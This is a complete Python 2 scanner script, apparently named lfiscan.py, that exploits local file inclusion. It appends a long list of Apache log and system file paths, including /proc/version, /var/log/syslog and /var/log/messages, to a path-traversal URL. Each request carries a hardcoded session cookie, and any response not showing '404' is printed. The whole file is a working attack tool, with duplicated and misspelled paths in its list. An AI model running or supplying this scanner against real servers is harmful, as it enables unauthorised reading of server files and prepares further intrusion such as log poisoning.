import os 
import requests
import sys

logs = ["var/log/httpd/access_log",
"var/log/httpd/error_log",
"apache/logs/error.log",
"apache/logs/access.log",
"apache/logs/error.log",
"apache/logs/access.log",
"apache/logs/error.log",
"apache/logs/access.log",
"apache/logs/error.log",
"apache/logs/access.log",
"apache/logs/error.log",
"apache/logs/access.log",
"logs/error.log",
"logs/access.log",
"logs/error.log",
"logs/access.log",
"var/log/apache2/access.log",
"var/log/apache2/error.log",
"var/log/apache2/access_log",
"var/log/apache2/error_log",
"logs/error.log",
"logs/access.log",
"logs/error.log",
"logs/access.log",
"logs/error.log",
"logs/access.log",
"etc/httpd/logs/acces_log",
"usr/lib/apache2/logs/error_log",
"usr/lib/apache2.logs/access_log",
"etc/httpd/logs/acces.log",
"etc/httpd/logs/error_log",
"etc/httpd/logs/error.log",
"var/www/logs/access_log",
"var/www/logs/access.log",
"usr/local/apache/logs/access_log",
"usr/local/apache/logs/access.log",
"var/log/apache/access_log",
"var/log/apache/access.log",
"var/log/access_log",
"var/www/logs/error_log",
"var/www/logs/error.log",
"usr/local/apache/logs/error_log",
"usr/local/apache/logs/error.log",
"var/log/apache/error_log",
"var/log/apache/error.log",
"var/log/access_log",
"def/halt",
"/var/log/httpd/access_log",
"var/log/messages",
"var/log/syslog",
"proc/version",
"/usr/local/apache2/logs/access_log",
"/usr/local/apache2/logs/access_log",
"/usr/local/apache2/logs/access_log",
"/var/log/apache2/access.log",
"/var/log/httpd/access_log",
"/var/log/httpd/access_log",
"/var/log/httpd/access_log",
"/var/log/apache2/access_log",
"/var/log/httpd/access_log",
"/var/log/httpd-access.log",
"/var/log/httpd-access.log",
"/var/www/logs/access_log",
"/var/apache2/logs/access_log",
"/var/apache2/logs/access_log",
"/var/log/httpd/error_log",
"/var/log/apache2/access_log",
"/var/log/apache2/access_log",
"var/log/error_log"]    

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <URL>"
    print "Example: python lfiscan.py http://192.168.0.1/index?page=../../../../"
    sys.exit()

for log in logs:
    url = sys.argv[1] + log
    cookie = {'PHPSESSID':'e011001638c5afd0a16294b229f30c45'}
    print url
    r = requests.get(url, cookies=cookie)
    reply = r.text 
    if "404" not in reply:
        print r.text


